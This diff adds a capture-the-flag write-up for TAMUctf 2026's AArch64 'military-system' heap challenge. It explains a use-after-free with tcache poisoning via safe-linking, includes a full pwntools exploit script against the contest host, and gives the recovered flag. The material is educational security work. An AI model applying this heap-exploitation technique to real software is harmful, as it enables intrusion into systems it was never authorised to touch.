@@ -1,0 +1,744 @@
+---
+title: 'Texas A&M University 2026 - military-system'
+description: 'A stale draft pointer in an AArch64 relay terminal becomes a tcache-poisoning primitive that overwrites auth state and unlocks the flag vault.'
+date: 2026-03-21
+category: 'texas-am-university-2026'
+discipline: 'binary-exploitation'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: This writeup is archived from the original solve notes. I did not re-test the remote service while importing it here. The bundled `fake-flag.txt` is only a local placeholder used for local testing and is not the real event flag.
+
+# Stale Draft, Fresh Flag
+
+## Intro
+
+This challenge looked like a small menu-driven heap binary, but it turned out to be a very clean lesson in stale metadata and tcache poisoning.
+
+The service simulates a military relay terminal:
+
+1. open a channel
+2. queue a draft
+3. edit a draft
+4. close a channel
+5. inspect status
+6. transmit the report
+
+The important mistake is that closing a channel frees the queued draft but does not clear the draft pointer or draft size. That leaves a use-after-free state behind. The status menu then leaks both the freed chunk pointer and a PIE function pointer, and the edit menu still trusts the stale metadata. From there the path is:
+
+1. free a `0x80` draft into tcache
+2. leak the freed user pointer
+3. poison the tcache forward pointer with safe-linking
+4. make `malloc(0x80)` return `g_auth`
+5. overwrite the auth fields checked by `Transmit report`
+6. dump `/flag.txt`
+
+The real flag recovered from the live service was:
+
+```text
+gigem{st4le_dr4ft_tcache_auth_bypass}
+```
+
+## Challenge Information
+
+Category: Binary Exploitation  
+Target: `military-system`  
+Architecture: AArch64  
+Service: `streams.tamuctf.com:443` with TLS SNI `military-system`  
+Goal: break into PATRIOT-7, recover the report, and extract the real flag
+
+The archive contained:
+
+```bash
+$ rg --files
+military-system.tar.gz
+military-system/fake-flag.txt
+military-system/Dockerfile
+military-system/entrypoint.sh
+military-system/military-system
+military-system/solver-template.py
+military-system/Makefile.debug
+```
+
+The solver template immediately revealed the live endpoint:
+
+```python
+from pwn import *
+
+context.log_level = "debug"
+io = remote("streams.tamuctf.com", 443, ssl=True, sni="military-system")
+io.interactive(prompt="")
+```
+
+## Recon: What Was Actually Shipped?
+
+The binary triage was straightforward:
+
+```bash
+$ file military-system
+military-system: ELF 64-bit LSB pie executable, ARM aarch64, dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, with debug_info, not stripped
+
+$ checksec --file=./military-system
+[*] './military-system'
+    Arch:       aarch64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+    Debuginfo:  Yes
+```
+
+That immediately suggested:
+
+```text
+heap bug + PIE leak + control over a meaningful data target
+```
+
+The Docker files were also useful because they explained both the runtime and the local debugging pain later:
+
+```dockerfile
+FROM debian:bookworm-slim
+
+RUN dpkg --add-architecture arm64 \
+    && apt-get update \
+    && apt-get install -y --no-install-recommends \
+        libc6:arm64 \
+        libgcc-s1:arm64 \
+        ncurses-bin \
+        qemu-user-static \
+        socat
+
+...
+
+COPY "${src_dir}/${FLAG_FILE}" /flag.txt
+USER nobody:nogroup
+EXPOSE 9001
+```
+
+And the entrypoint showed the service model:
+
+```sh
+if [ "$(uname -m)" = "aarch64" ]; then
+    runner="./military-system"
+else
+    runner="qemu-aarch64-static ./military-system"
+fi
+
+exec socat TCP-LISTEN:9001,reuseaddr,fork EXEC:"$runner",stderr
+```
+
+So the flag is not hidden in some strange helper. The binary simply opens `/flag.txt` if authorization succeeds.
+
+## Struct Recovery
+
+Because the binary still had debug info, the first productive step was asking GDB for the real struct layouts instead of guessing from disassembly:
+
+```bash
+$ gdb -q military-system \
+    -ex 'set pagination off' \
+    -ex 'ptype /o Channel' \
+    -ex 'ptype /o AuthBlock' \
+    -ex 'ptype /o OpsTable' \
+    -ex 'quit'
+```
+
+Output:
+
+```c
+type = struct {
+/*      0      |       4 */    int open;
+/* XXX  4-byte hole      */
+/*      8      |       8 */    size_t draft_size;
+/*     16      |       8 */    char *draft;
+/*     24      |      32 */    char label[32];
+
+                               /* total size (bytes):   56 */
+                             }
+
+type = struct {
+/*      0      |      32 */    char operator[32];
+/*     32      |       4 */    uint32_t verified;
+/*     36      |       4 */    uint32_t clearance;
+/*     40      |      16 */    char mission[16];
+/*     56      |      72 */    char padding[72];
+
+                               /* total size (bytes):  128 */
+                             }
+
+type = struct {
+/*      0      |       8 */    void (*status_hook)(size_t, const Channel *);
+
+                               /* total size (bytes):    8 */
+                             }
+```
+
+That layout already tells the story:
+
+1. `Channel` stores exactly the stale fields we care about: `draft_size` and `draft`.
+2. `AuthBlock` is exactly `128` bytes, which is the maximum allowed draft size.
+3. A poisoned `malloc(128)` returning `g_auth` is a perfect fit.
+
+## Static Analysis: The Relevant Menu Logic
+
+The entire menu loop lives inside `main`, so I used cross `objdump`, GDB line info, and Radare2 pseudocode to reconstruct the interesting branches.
+
+### Queue Draft
+
+The draft allocation path is the block at `0x12f0`:
+
+```asm
+12f0: adrp x0, 2000
+12f4: add  x0, x0, #0x50          ; "Draft bytes (64-128): "
+12fc: bl   18b0 <read_ulong_prompt>
+1300: sub  x1, x0, #0x40
+1308: cmp  x1, #0x40
+130c: b.hi 13c0                    ; reject unless 64 <= size <= 128
+1314: bl   bd0 <malloc@plt>
+131c: str  x0, [x2, #16]           ; ch->draft = malloc(size)
+1330: str  x4, [x2, #8]            ; ch->draft_size = size
+1370: bl   c70 <read@plt>          ; read payload into draft
+```
+
+So drafts are clean `malloc(size)` chunks and the user can choose up to `128` bytes.
+
+### Close Channel
+
+The close handler is the block at `0x10f4`:
+
+```asm
+110c: mul  x0, x1, x0              ; slot * sizeof(Channel)
+111c: add  x3, x2, x0              ; x3 = &channel
+1120: ldr  w0, [x2, x0]            ; ch->open
+1124: cbz  w0, 13b0                ; already closed
+1128: ldr  x0, [x3, #16]           ; ch->draft
+112c: cbz  x0, 113c
+1134: bl   c60 <free@plt>          ; free(ch->draft)
+113c: ...
+1154: str  wzr, [x2, x1]           ; ch->open = 0
+```
+
+This is the core bug.
+
+It frees `ch->draft`, but it only clears `ch->open`.
+
+It does **not** clear:
+
+1. `ch->draft`
+2. `ch->draft_size`
+
+That leaves a channel in a classic stale-metadata UAF state.
+
+### Edit Draft
+
+The edit handler begins at `0x0f20` and the actual write happens at `0x11d4`:
+
+```asm
+f44: ldr  x0, [x2, #16]            ; ch->draft
+f48: cbz  x0, f54                  ; reject if NULL
+f4c: ldr  x0, [x2, #8]             ; ch->draft_size
+f50: cbnz x0, 11d4                 ; accept if non-zero
+```
+
+Important detail:
+
+```text
+it never checks ch->open
+```
+
+So a closed channel with stale `draft` and stale `draft_size` is still editable.
+
+The actual write path:
+
+```asm
+11d4: ...                          ; "Editor span: "
+11e0: bl   18b0 <read_ulong_prompt>
+11f8: ldr  x0, [x2, #8]            ; ch->draft_size
+11fc: cmp  x0, w4, uxtb
+1200: b.cc 13d0                    ; reject if span > draft_size
+1220: ldr  x0, [x2, #16]           ; ch->draft
+1240: add  x1, x20, x3             ; draft + offset
+124c: bl   c70 <read@plt>          ; write into freed chunk
+```
+
+This gives a write primitive directly into freed heap memory.
+
+### View Status Leak
+
+The status function is `render_status` at `0x17a0`. Radare2 decompilation makes the intended leak obvious:
+
+```c
+printf("[STATUS] channel=%zu state=%s\n", slot, open ? "OPEN" : "CLOSED");
+printf("[STATUS] callsign=%s\n", ch->label[0] ? ch->label : "<unset>");
+printf("[STATUS] draft_size=%#zx\n", ch->draft_size);
+
+if (ch->open == 0 && ch->draft != NULL) {
+    printf("[STATUS] last_draft=%p\n", ch->draft);
+    printf("[STATUS] diagnostic_hook=%p\n", g_ops.status_hook);
+    puts("[STATUS] stale metadata retained for deferred audit replay.");
+}
+```
+
+That leak gives us exactly what we need:
+
+1. the freed draft user pointer, to encode a safe-linked tcache forward pointer
+2. a PIE function pointer, to recover the image base
+
+### Transmit Report
+
+The `Transmit report` logic is at `0x1160` and the flag path is at `0x1274`:
+
+```asm
+118c: ldr  x1, [x1, #160]          ; load 8 bytes starting at g_auth+32
+1190: mov  x0, #0x4d44
+1194: movk x0, #0x434f, lsl #16
+1198: movk x0, #0x7,    lsl #32
+119c: cmp  x1, x0
+11a0: b.eq 1274                    ; auth passes if qword == 0x00000007434f4d44
+11a4: ... puts("[PATRIOT-7] Clearance denied.")
+```
+
+And the success path:
+
+```asm
+1274: adrp x0, 2000
+127c: add  x0, x0, #0x288          ; "/flag.txt"
+1280: bl   be0 <open@plt>
+1298: add  x0, x0, #0x2b8          ; "[PATRIOT-7] Transmitting sealed report:"
+12c0: bl   c70 <read@plt>
+12ac: bl   c20 <write@plt>
+```
+
+That compare is against the 8-byte value:
+
+```text
+0x00000007434f4d44
+```
+
+Interpreted as the two adjacent 32-bit fields inside `AuthBlock`, that means:
+
+1. `verified  = 0x434f4d44`
+2. `clearance = 7`
+
+In little-endian memory, the exact bytes are:
+
+```text
+44 4d 4f 43 07 00 00 00
+```
+
+So we do not need code execution at all. We only need to make a future `malloc(128)` return `g_auth` and then write those eight bytes at offset `32`.
+
+## Exploit Strategy
+
+At that point the cleanest path was:
+
+1. Open both channels.
+2. Queue a `128`-byte draft in both channels.
+3. Close both channels so both `0x90` chunks enter the `0x90` tcache bin.
+4. Use `View status` on channel 0 to leak:
+   - `last_draft`, the freed user pointer
+   - `diagnostic_hook`, the PIE function pointer to `render_status`
+5. Use `Edit draft` on the closed channel 0 to overwrite the freed chunk's `next` pointer with a safe-linked encoding of `g_auth`.
+6. Re-open channel 0 and queue `128` bytes.
+   - This pops the real freed chunk and leaves the poisoned forward pointer in tcache.
+7. Re-open channel 1 and queue `128` bytes.
+   - This second `malloc(128)` returns `g_auth`.
+8. Write the required auth value into `g_auth+32`.
+9. Call `Transmit report`.
+
+The critical safe-linking relation is:
+
+```text
+stored_next = desired_next ^ (victim_user_ptr >> 12)
+```
+
+Here:
+
+1. `victim_user_ptr` is the leaked `last_draft`
+2. `desired_next` is the absolute address of `g_auth`
+
+Because the tcache entry overlay starts at the freed user pointer itself, the leak from `View status` is exactly the address needed for the safe-linking calculation.
+
+## Local Leak Values and Math
+
+During local validation under emulation, `View status` produced:
+
+```text
+[STATUS] channel=0 state=CLOSED
+[STATUS] callsign=A
+[STATUS] draft_size=0x80
+[STATUS] last_draft=0x7fd0a0c30310
+[STATUS] diagnostic_hook=0x7fd0a26b17a0
+[STATUS] stale metadata retained for deferred audit replay.
+```
+
+That gives:
+
+```text
+pie_base = diagnostic_hook - 0x17a0
+         = 0x7fd0a26b0000
+
+g_auth   = pie_base + 0x200a0
+         = 0x7fd0a26d00a0
+```
+
+And the poisoned forward pointer becomes:
+
+```text
+encoded_next = g_auth ^ (last_draft >> 12)
+```
+
+The same calculation on the live service used:
+
+```text
+last_draft      = 0x5500021890
+diagnostic_hook = 0x55000017a0
+pie_base        = 0x5500000000
+g_auth          = 0x55000200a0
+```
+
+## Experiment Log
+
+I am keeping the failed and intermediate steps here on purpose, because they were part of the real solve and they matter for reproducibility.
+
+### Experiment 1: Plain `objdump`
+
+The first static attempt used the system `objdump`:
+
+```bash
+$ objdump -d military-system/military-system
+objdump: can't disassemble for architecture UNKNOWN!
+```
+
+This was not a binary problem. It was just the wrong toolchain for AArch64 on the host. I switched to Radare2 first, and later installed `binutils-aarch64-linux-gnu`.
+
+### Experiment 2: Run the Binary Locally With Existing Tools
+
+At first, neither cross binutils nor QEMU user emulation were present:
+
+```bash
+$ which aarch64-linux-gnu-objdump || which llvm-objdump
+aarch64-linux-gnu-objdump not found
+llvm-objdump not found
+
+$ which qemu-aarch64-static || which qemu-aarch64
+qemu-aarch64-static not found
+qemu-aarch64 not found
+```
+
+So I installed what I needed locally:
+
+```bash
+$ apt-get update && apt-get install -y \
+    qemu-user-static \
+    binutils-aarch64-linux-gnu \
+    gdb-multiarch \
+    libc6-arm64-cross
+```
+
+### Experiment 3: Wrong QEMU Binary Name
+
+After installation I still tried the wrong executable first:
+
+```bash
+$ qemu-aarch64-static -L /usr/aarch64-linux-gnu military-system/military-system
+zsh:1: command not found: qemu-aarch64-static
+```
+
+The installed binary was actually:
+
+```bash
+$ ls /usr/bin/qemu-* | rg aarch64
+/usr/bin/qemu-aarch64
+/usr/bin/qemu-aarch64_be
+```
+
+### Experiment 4: Native Local Run Under QEMU Fails Because of Seccomp
+
+Running the original challenge binary under user-mode QEMU failed before the menu loop became useful:
+
+```bash
+$ printf '7\n' | qemu-aarch64 -L /usr/aarch64-linux-gnu military-system/military-system
+...
+[PATRIOT-7] Secure relay online.
+[PATRIOT-7] Operator shell disabled. Flag vault is relay-only.
+
+seccomp install: Invalid argument
+```
+
+This was a local emulation issue, not a challenge-side mitigation failure. The binary's seccomp setup did not like user-mode QEMU.
+
+### Experiment 5: Patch Out `install_seccomp` For Local Validation
+
+To validate the exploit locally without changing the real challenge binary, I made a throwaway copy and replaced `install_seccomp` with a single `ret`:
+
+```bash
+$ cp military-system military-system.noseccomp
+$ printf '\xc0\x03\x5f\xd6' | dd of=military-system.noseccomp bs=1 seek=$((0x15d0)) conv=notrunc
+4+0 records in
+4+0 records out
+```
+
+That was only for local experimentation. The final remote solve used the untouched original service.
+
+### Experiment 6: First Local Success Against the Fake Flag
+
+For local emulation I copied the bundled fake flag to the expected runtime path:
+
+```bash
+$ cp fake-flag.txt /flag.txt
+```
+
+Then I ran the exploit logic against the patched local test binary and got:
+
+```text
+[PATRIOT-7] Transmitting sealed report:
+gigem{stale_draft_demo}
+```
+
+This was important because it confirmed:
+
+1. the UAF was real
+2. the tcache poisoning math was correct
+3. the auth overwrite was sufficient
+4. I did not need a more complicated control-flow hijack
+
+### Experiment 7: Early Hypothesis - Overwrite `status_hook`
+
+The `diagnostic_hook` leak makes `g_ops.status_hook` look like the obvious target.
+
+I considered:
+
+1. poisoning tcache into `g_ops`
+2. overwriting the function pointer
+3. triggering menu option `5`
+
+But this was clearly worse than targeting `g_auth`:
+
+1. `g_ops` is only 8 bytes wide and sits next to `g_channels`, so a `128`-byte write would be messy.
+2. `g_auth` is exactly `128` bytes, which matches the largest draft size perfectly.
+3. `Transmit report` already gives the flag directly if auth matches, so code execution would be unnecessary overkill.
+
+So I dropped the function-pointer path and kept the exploit data-only.
+
+### Experiment 8: Live Solve
+
+After the local fake-flag validation, I ran the solver against the real service:
+
+```bash
+$ python3 solve.py
+[+] gigem{st4le_dr4ft_tcache_auth_bypass}
+gigem{st4le_dr4ft_tcache_auth_bypass}
+```
+
+That confirmed the real flag and closed the loop.
+
+## Final Solver
+
+I saved the final exploit as [solve.py](./solve.py). The full script is below.
+
+```python
+import re
+from pathlib import Path
+
+from pwn import *
+
+
+HOST = "streams.tamuctf.com"
+PORT = 443
+SNI = "military-system"
+
+HERE = Path(__file__).resolve().parent
+BIN = ELF(str(HERE / "military-system"), checksec=False)
+MAGIC_CLEARANCE = 0x00000007434F4D44
+STATUS_HOOK_OFF = BIN.symbols["render_status"]
+G_AUTH_OFF = BIN.symbols["g_auth"]
+
+
+def start():
+    return remote(HOST, PORT, ssl=True, sni=SNI)
+
+
+def menu(io, choice):
+    io.sendlineafter(b"> ", str(choice).encode())
+
+
+def open_channel(io, slot, callsign):
+    menu(io, 1)
+    io.sendlineafter(b"Slot: ", str(slot).encode())
+    io.sendafter(b"Callsign: ", callsign + b"\n")
+
+
+def queue_message(io, slot, size, data):
+    assert 64 <= size <= 128
+    assert len(data) == size
+    menu(io, 2)
+    io.sendlineafter(b"Slot: ", str(slot).encode())
+    io.sendlineafter(b"Draft bytes (64-128): ", str(size).encode())
+    io.sendafter(f"Draft payload ({size} bytes): ".encode(), data)
+
+
+def edit_draft(io, slot, span, data):
+    assert len(data) == span
+    menu(io, 3)
+    io.sendlineafter(b"Slot: ", str(slot).encode())
+    io.sendlineafter(b"Editor span: ", str(span).encode())
+    io.sendafter(f"Patch bytes ({span}): ".encode(), data)
+
+
+def close_channel(io, slot):
+    menu(io, 4)
+    io.sendlineafter(b"Slot: ", str(slot).encode())
+
+
+def view_status(io, slot):
+    menu(io, 5)
+    io.sendlineafter(b"Slot: ", str(slot).encode())
+    return io.recvuntil(b"1. Open channel", drop=False)
+
+
+def transmit_report(io, slot):
+    menu(io, 6)
+    io.sendlineafter(b"Slot: ", str(slot).encode())
+
+
+def main():
+    io = start()
+
+    size = 128
+
+    open_channel(io, 0, b"A")
+    open_channel(io, 1, b"B")
+
+    queue_message(io, 0, size, b"A" * size)
+    queue_message(io, 1, size, b"B" * size)
+
+    close_channel(io, 1)
+    close_channel(io, 0)
+
+    status = view_status(io, 0).decode()
+
+    draft_ptr = int(re.search(r"last_draft=(0x[0-9a-fA-F]+)", status).group(1), 16)
+    status_hook = int(re.search(r"diagnostic_hook=(0x[0-9a-fA-F]+)", status).group(1), 16)
+
+    pie_base = status_hook - STATUS_HOOK_OFF
+    g_auth = pie_base + G_AUTH_OFF
+
+    encoded_next = g_auth ^ (draft_ptr >> 12)
+    edit_draft(io, 0, 8, p64(encoded_next))
+
+    open_channel(io, 0, b"C")
+    queue_message(io, 0, size, b"C" * size)
+
+    open_channel(io, 1, b"D")
+    payload = bytearray(b"X" * size)
+    payload[32:40] = p64(MAGIC_CLEARANCE)
+    queue_message(io, 1, size, bytes(payload))
+
+    transmit_report(io, 1)
+
+    output = io.recvrepeat(2)
+    match = re.search(rb"gigem\{[^}]+\}", output)
+    if not match:
+        log.failure("flag not found")
+        io.interactive(prompt="")
+        return
+
+    flag = match.group(0).decode()
+    log.success(flag)
+    print(flag)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Why the Exploit Works
+
+The exploit depends on three separate mistakes that compose very well:
+
+### 1. Close Frees Memory but Leaves Metadata Behind
+
+`close_channel()` frees `draft`, but leaves:
+
+1. `draft`
+2. `draft_size`
+
+in place.
+
+That turns the channel object into a stale capability for a freed heap chunk.
+
+### 2. Edit Trusts Stale Metadata
+
+`edit_draft()` only checks:
+
+1. `draft != NULL`
+2. `draft_size != 0`
+3. `span <= draft_size`
+
+It does not require the channel to still be open.
+
+So after `close`, `edit` becomes a UAF write primitive into a tcache entry.
+
+### 3. Status Leaks Exactly the Two Values Safe-Linking Needs
+
+`view_status()` prints:
+
+1. the stale freed user pointer
+2. the `status_hook` function pointer
+
+The first is enough to encode a poisoned tcache forward pointer.
+
+The second is enough to recover the PIE base and then compute `g_auth`.
+
+Once `malloc(128)` returns `g_auth`, the rest is only a data overwrite:
+
+```text
+g_auth.verified  = 0x434f4d44
+g_auth.clearance = 7
+```
+
+After that, the built-in transmit path opens `/flag.txt` and prints it for us.
+
+## Live Service Output
+
+The final live run printed:
+
+```text
+[PATRIOT-7] Transmitting sealed report:
+gigem{st4le_dr4ft_tcache_auth_bypass}
+```
+
+## Flag
+
+```text
+gigem{st4le_dr4ft_tcache_auth_bypass}
+```
+
+## Closing
+
+PATRIOT-7 is a nice example of why stale metadata bugs are dangerous even when the initial primitive looks small.
+
+There was no need for:
+
+1. shellcode
+2. a libc leak
+3. a ROP chain
+4. a GOT overwrite
+
+The binary already contained a privileged data path:
+
+```text
+if auth fields match -> open("/flag.txt") -> read -> write
+```
+
+So the real job was not “get code execution at all costs”.
+
+It was:
+
+```text
+identify the smallest state corruption that unlocks the intended privileged path
+```
+
+That usually leads to cleaner exploits, faster solves, and fewer remote surprises.
